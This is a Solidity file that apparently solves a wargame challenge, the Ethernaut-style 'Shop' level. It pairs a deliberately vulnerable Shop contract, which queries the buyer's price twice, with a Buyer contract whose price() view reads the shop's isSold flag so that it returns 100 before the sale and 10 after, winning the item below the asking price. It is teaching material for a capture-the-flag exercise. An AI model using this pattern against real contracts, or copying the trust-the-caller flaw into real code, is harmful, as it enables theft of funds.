// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// interface Buyer {
//     function price() external view returns (uint);
// }

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    // we have to make sure that the 2nd time price is called it should return less than 100 as it;s a view function
    //we can't take and state and updated it. But we can access tha state that's being changed in shop contract
    //and send price based on if isSold is true or not

    function price() public view returns (uint) {
        if (shop.isSold()) {
            return 10;
        }
        return 100;
    }

    function isSold() public view returns (bool) {
        return shop.isSold();
    }

    function Buy() public {
        shop.buy();
    }
}
